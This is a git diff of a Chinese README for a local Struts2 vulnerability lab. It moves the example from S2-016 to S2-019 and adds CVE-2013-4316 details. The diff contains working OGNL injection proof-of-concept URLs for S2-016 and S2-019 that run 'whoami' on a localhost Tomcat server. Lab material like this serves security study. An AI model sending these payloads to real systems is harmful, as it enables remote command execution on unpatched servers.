@@ -10,14 +10,14 @@ git branch -a
 
 3.切换到分支
 git checkout 分支名
-如git checkout S2-016
+如git checkout S2-019
 
 4.打包
 mvn clean package
 
 5.部署在Tomcat中
-将\target中生成的Struts2-016.war复制到Tomcat下的webapps目录中，然后开启Tomcat
-访问http://127.0.0.1:8080/Struts2-016/index.action
+将\target中生成的Struts2-019.war复制到Tomcat下的webapps目录中，然后开启Tomcat
+访问http://127.0.0.1:8080/Struts2-019/index.action
 
 # 相关信息
 
@@ -64,5 +64,16 @@ CVE-2013-2251
 
 POC:
 http://127.0.0.1:8080/Struts2-016/index.action?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'whoami'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D
+
+5.S2-019
+
+CVE-2013-4316
+
+影响版本：Struts 2.0.0 – Struts 2.3.15.1
+
+官方公告：http://struts.apache.org/docs/s2-019.html
+
+POC:
+http://127.0.0.1:8080/Struts2-019/index.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),%23b=%23a.getInputStream(),%23c=new java.io.InputStreamReader(%23b),%23d=new java.io.BufferedReader(%23c),%23e=new char[1000],%23d.read(%23e),%23resp.println(%23e),%23resp.close()
 
 
